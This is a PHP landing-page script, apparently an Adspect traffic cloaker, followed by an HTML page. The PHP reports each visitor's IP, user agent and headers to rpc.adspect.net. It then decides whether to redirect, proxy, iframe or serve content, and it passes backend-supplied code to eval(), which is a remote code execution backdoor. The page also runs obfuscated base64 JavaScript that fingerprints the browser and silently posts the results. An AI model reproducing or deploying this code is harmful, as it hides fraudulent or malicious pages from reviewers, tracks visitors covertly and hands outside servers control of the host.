<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('bec78a7f-1273-4b9d-b208-b90dfbc2d051', 'redirect', '_', base64_decode('k0MEVijHwYAVssxhDgUXpPzymW7sg7TA792OpvzNsMk=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDQzNmI9WydUb3VjaEV2ZW50Jywnb2JqZWN0JywnbWV0aG9kJywnY29uc29sZScsJ05vdGlmaWNhdGlvbicsJzY2NDE4NndZYk93aScsJ21lc3NhZ2UnLCdsb2NhdGlvbicsJ2RhdGEnLCdpbnB1dCcsJ3dlYmdsJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvJywnc2NyZWVuJywnZG9jdW1lbnRFbGVtZW50Jywnbm9kZVZhbHVlJywndmFsdWUnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnMzA5Njk4bE1ndUlhJywnZG9jdW1lbnQnLCdjbG9zdXJlJywnaHJlZicsJ3RoZW4nLCcyaXRrS2VoJywncHVzaCcsJ2FjdGlvbicsJzQwNTc0MTBnSW5oRWInLCdsb2cnLCduYXZpZ2F0b3InLCd0b3N0cmluZycsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ3Blcm1pc3Npb24nLCdhcHBlbmRDaGlsZCcsJ3RvU3RyaW5nJywnd2luZG93JywnbGVuZ3RoJywnbm90aWZpY2F0aW9ucycsJ3F1ZXJ5JywnZ2V0VGltZXpvbmVPZmZzZXQnLCd0eXBlJywnc3RhdGUnLCczNjUxMjdNVVh2c3gnLCdnZXRQYXJhbWV0ZXInLCcxNDFWYUFVakknLCdub2RlTmFtZScsJ2NyZWF0ZUV2ZW50JywnY2FudmFzJywncGVybWlzc2lvbnMnLCd0aW1lem9uZU9mZnNldCcsJzI5NjcxNmNMSWRZZScsJ2NyZWF0ZUVsZW1lbnQnLCdQT1NUJywndG91Y2hFdmVudCcsJzExNTE5MTVWa3JtaWQnLCdmdW5jdGlvbicsJ2dldEV4dGVuc2lvbicsJ3N1Ym1pdCcsJzcyMDF4SHJoV3knLCdhdHRyaWJ1dGVzJywnbmFtZSddO3ZhciBfMHgxZmE5PWZ1bmN0aW9uKF8weDFiY2Q1ZSxfMHgxMDI4YTcpe18weDFiY2Q1ZT1fMHgxYmNkNWUtMHgxYmE7dmFyIF8weDQzNmIzMz1fMHg0MzZiW18weDFiY2Q1ZV07cmV0dXJuIF8weDQzNmIzMzt9OyhmdW5jdGlvbihfMHgyYzkyNmEsXzB4MTE3MDE5KXt2YXIgXzB4YjdhYjEzPV8weDFmYTk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHg1ZWQwZmE9LXBhcnNlSW50KF8weGI3YWIxMygweDFlYSkpK3BhcnNlSW50KF8weGI3YWIxMygweDFlMCkpKi1wYXJzZUludChfMHhiN2FiMTMoMHgxZWUpKStwYXJzZUludChfMHhiN2FiMTMoMHgxYzcpKSstcGFyc2VJbnQoXzB4YjdhYjEzKDB4MWJhKSkrLXBhcnNlSW50KF8weGI3YWIxMygweDFjYykpKnBhcnNlSW50KF8weGI3YWIxMygweDFlNikpKy1wYXJzZUludChfMHhiN2FiMTMoMHgxZGUpKStwYXJzZUludChfMHhiN2FiMTMoMHgxY2YpKTtpZihfMHg1ZWQwZmE9PT1fMHgxMTcwMTkpYnJlYWs7ZWxzZSBfMHgyYzkyNmFbJ3B1c2gnXShfMHgyYzkyNmFbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDM4N2I4OSl7XzB4MmM5MjZhWydwdXNoJ10oXzB4MmM5MjZhWydzaGlmdCddKCkpO319fShfMHg0MzZiLDB4OGNlNTMpLGZ1bmN0aW9uKCl7dmFyIF8weDQ1ZDdiZT1fMHgxZmE5O2Z1bmN0aW9uIF8weDEyYTQxOSgpe3ZhciBfMHg0MDM0NjE9XzB4MWZhOTtfMHgxMDA2OWRbJ2Vycm9ycyddPV8weDE1NzJjZjt2YXIgXzB4MWE4YjczPWRvY3VtZW50W18weDQwMzQ2MSgweDFlNyldKCdmb3JtJyksXzB4MjE1YmY0PWRvY3VtZW50W18weDQwMzQ2MSgweDFlNyldKF8weDQwMzQ2MSgweDFiZSkpO18weDFhOGI3M1tfMHg0MDM0NjEoMHgxZjMpXT1fMHg0MDM0NjEoMHgxZTgpLF8weDFhOGI3M1tfMHg0MDM0NjEoMHgxY2UpXT13aW5kb3dbJ2xvY2F0aW9uJ11bXzB4NDAzNDYxKDB4MWNhKV0sXzB4MjE1YmY0W18weDQwMzQ2MSgweDFkYyldPSdoaWRkZW4nLF8weDIxNWJmNFtfMHg0MDM0NjEoMHgxZjApXT1fMHg0MDM0NjEoMHgxYmQpLF8weDIxNWJmNFtfMHg0MDM0NjEoMHgxYzUpXT1KU09OWydzdHJpbmdpZnknXShfMHgxMDA2OWQpLF8weDFhOGI3M1tfMHg0MDM0NjEoMHgxZDUpXShfMHgyMTViZjQpLGRvY3VtZW50Wydib2R5J11bXzB4NDAzNDYxKDB4MWQ1KV0oXzB4MWE4YjczKSxfMHgxYThiNzNbXzB4NDAzNDYxKDB4MWVkKV0oKTt9dmFyIF8weDE1NzJjZj1bXSxfMHgxMDA2OWQ9e307dHJ5e3ZhciBfMHg1N2JhY2E9ZnVuY3Rpb24oXzB4MmQ2YmZkKXt2YXIgXzB4ZGUxYzgxPV8weDFmYTk7aWYoXzB4ZGUxYzgxKDB4MWYyKT09PXR5cGVvZiBfMHgyZDZiZmQmJm51bGwhPT1fMHgyZDZiZmQpe3ZhciBfMHg0MDhiMmI9ZnVuY3Rpb24oXzB4MWY0NTRhKXt2YXIgXzB4MjA3OWNiPV8weGRlMWM4MTt0cnl7dmFyIF8weDIyOTA2Yj1fMHgyZDZiZmRbXzB4MWY0NTRhXTtzd2l0Y2godHlwZW9mIF8weDIyOTA2Yil7Y2FzZSBfMHgyMDc5Y2IoMHgxZjIpOmlmKG51bGw9PT1fMHgyMjkwNmIpYnJlYWs7Y2FzZSBfMHgyMDc5Y2IoMHgxZWIpOl8weDIyOTA2Yj1fMHgyMjkwNmJbJ3RvU3RyaW5nJ10oKTt9XzB4MjRkYzg5W18weDFmNDU0YV09XzB4MjI5MDZiO31jYXRjaChfMHgyMjY0NDYpe18weDE1NzJjZlsncHVzaCddKF8weDIyNjQ0NltfMHgyMDc5Y2IoMHgxYmIpXSk7fX0sXzB4MjRkYzg5PXt9LF8weDIxMjI4Njtmb3IoXzB4MjEyMjg2IGluIF8weDJkNmJmZClfMHg0MDhiMmIoXzB4MjEyMjg2KTt0cnl7dmFyIF8weDRkMmQ4Yz1PYmplY3RbXzB4ZGUxYzgxKDB4MWM2KV0oXzB4MmQ2YmZkKTtmb3IoXzB4MjEyMjg2PTB4MDtfMHgyMTIyODY8XzB4NGQyZDhjW18weGRlMWM4MSgweDFkOCldOysrXzB4MjEyMjg2KV8weDQwOGIyYihfMHg0ZDJkOGNbXzB4MjEyMjg2XSk7XzB4MjRkYzg5WychISddPV8weDRkMmQ4Yzt9Y2F0Y2goXzB4NTI4NDJhKXtfMHgxNTcyY2ZbJ3B1c2gnXShfMHg1Mjg0MmFbXzB4ZGUxYzgxKDB4MWJiKV0pO31yZXR1cm4gXzB4MjRkYzg5O319O18weDEwMDY5ZFtfMHg0NWQ3YmUoMHgxYzIpXT1fMHg1N2JhY2Eod2luZG93W18weDQ1ZDdiZSgweDFjMildKSxfMHgxMDA2OWRbXzB4NDVkN2JlKDB4MWQ3KV09XzB4NTdiYWNhKHdpbmRvdyksXzB4MTAwNjlkW18weDQ1ZDdiZSgweDFkMSldPV8weDU3YmFjYSh3aW5kb3dbXzB4NDVkN2JlKDB4MWQxKV0pLF8weDEwMDY5ZFsnbG9jYXRpb24nXT1fMHg1N2JhY2Eod2luZG93W18weDQ1ZDdiZSgweDFiYyldKSxfMHgxMDA2OWRbXzB4NDVkN2JlKDB4MWY0KV09XzB4NTdiYWNhKHdpbmRvd1tfMHg0NWQ3YmUoMHgxZjQpXSksXzB4MTAwNjlkW18weDQ1ZDdiZSgweDFjMyldPWZ1bmN0aW9uKF8weDIzODM5Yyl7dmFyIF8weDJiNWNhMj1fMHg0NWQ3YmU7dHJ5e3ZhciBfMHgyYzgzMzA9e307XzB4MjM4MzljPV8weDIzODM5Y1tfMHgyYjVjYTIoMHgxZWYpXTtmb3IodmFyIF8weDQ4Mzg5ZiBpbiBfMHgyMzgzOWMpXzB4NDgzODlmPV8weDIzODM5Y1tfMHg0ODM4OWZdLF8weDJjODMzMFtfMHg0ODM4OWZbXzB4MmI1Y2EyKDB4MWUxKV1dPV8weDQ4Mzg5ZltfMHgyYjVjYTIoMHgxYzQpXTtyZXR1cm4gXzB4MmM4MzMwO31jYXRjaChfMHg0MTBjZDcpe18weDE1NzJjZltfMHgyYjVjYTIoMHgxY2QpXShfMHg0MTBjZDdbXzB4MmI1Y2EyKDB4MWJiKV0pO319KGRvY3VtZW50W18weDQ1ZDdiZSgweDFjMyldKSxfMHgxMDA2OWRbXzB4NDVkN2JlKDB4MWM4KV09XzB4NTdiYWNhKGRvY3VtZW50KTt0cnl7XzB4MTAwNjlkW18weDQ1ZDdiZSgweDFlNSldPW5ldyBEYXRlKClbXzB4NDVkN2JlKDB4MWRiKV0oKTt9Y2F0Y2goXzB4NGJjZjgwKXtfMHgxNTcyY2ZbXzB4NDVkN2JlKDB4MWNkKV0oXzB4NGJjZjgwW18weDQ1ZDdiZSgweDFiYildKTt9dHJ5e18weDEwMDY5ZFtfMHg0NWQ3YmUoMHgxYzkpXT1mdW5jdGlvbigpe31bXzB4NDVkN2JlKDB4MWQ2KV0oKTt9Y2F0Y2goXzB4NTllMzM5KXtfMHgxNTcyY2ZbXzB4NDVkN2JlKDB4MWNkKV0oXzB4NTllMzM5W18weDQ1ZDdiZSgweDFiYildKTt9dHJ5e18weDEwMDY5ZFtfMHg0NWQ3YmUoMHgxZTkpXT1kb2N1bWVudFtfMHg0NWQ3YmUoMHgxZTIpXShfMHg0NWQ3YmUoMHgxZjEpKVtfMHg0NWQ3YmUoMHgxZDYpXSgpO31jYXRjaChfMHg0YjRkMzYpe18weDE1NzJjZlsncHVzaCddKF8weDRiNGQzNltfMHg0NWQ3YmUoMHgxYmIpXSk7fXRyeXtfMHg1N2JhY2E9ZnVuY3Rpb24oKXt9O3ZhciBfMHg1NjMwNzg9MHgwO18weDU3YmFjYVtfMHg0NWQ3YmUoMHgxZDYpXT1mdW5jdGlvbigpe3JldHVybisrXzB4NTYzMDc4LCcnO30sY29uc29sZVtfMHg0NWQ3YmUoMHgxZDApXShfMHg1N2JhY2EpLF8weDEwMDY5ZFtfMHg0NWQ3YmUoMHgxZDIpXT1fMHg1NjMwNzg7fWNhdGNoKF8weDRmMTYwYil7XzB4MTU3MmNmW18weDQ1ZDdiZSgweDFjZCldKF8weDRmMTYwYlsnbWVzc2FnZSddKTt9d2luZG93WyduYXZpZ2F0b3InXVtfMHg0NWQ3YmUoMHgxZTQpXVtfMHg0NWQ3YmUoMHgxZGEpXSh7J25hbWUnOl8weDQ1ZDdiZSgweDFkOSl9KVtfMHg0NWQ3YmUoMHgxY2IpXShmdW5jdGlvbihfMHgzZjdjZTUpe3ZhciBfMHg1ZTk4YjU9XzB4NDVkN2JlO18weDEwMDY5ZFsncGVybWlzc2lvbnMnXT1bd2luZG93W18weDVlOThiNSgweDFmNSldW18weDVlOThiNSgweDFkNCldLF8weDNmN2NlNVtfMHg1ZTk4YjUoMHgxZGQpXV0sXzB4MTJhNDE5KCk7fSxfMHgxMmE0MTkpO3RyeXt2YXIgXzB4NWQzYTBjPWRvY3VtZW50W18weDQ1ZDdiZSgweDFlNyldKF8weDQ1ZDdiZSgweDFlMykpWydnZXRDb250ZXh0J10oXzB4NDVkN2JlKDB4MWJmKSksXzB4MmM0YTdkPV8weDVkM2EwY1tfMHg0NWQ3YmUoMHgxZWMpXShfMHg0NWQ3YmUoMHgxYzEpKTtfMHgxMDA2OWRbXzB4NDVkN2JlKDB4MWJmKV09eyd2ZW5kb3InOl8weDVkM2EwY1tfMHg0NWQ3YmUoMHgxZGYpXShfMHgyYzRhN2RbXzB4NDVkN2JlKDB4MWQzKV0pLCdyZW5kZXJlcic6XzB4NWQzYTBjW18weDQ1ZDdiZSgweDFkZildKF8weDJjNGE3ZFtfMHg0NWQ3YmUoMHgxYzApXSl9O31jYXRjaChfMHgyZGMwOWEpe18weDE1NzJjZlsncHVzaCddKF8weDJkYzA5YVtfMHg0NWQ3YmUoMHgxYmIpXSk7fX1jYXRjaChfMHg0MGYxM2Ipe18weDE1NzJjZltfMHg0NWQ3YmUoMHgxY2QpXShfMHg0MGYxM2JbXzB4NDVkN2JlKDB4MWJiKV0pLF8weDEyYTQxOSgpO319KCkpOw=="></script>
</body>
</html>
<?php exit;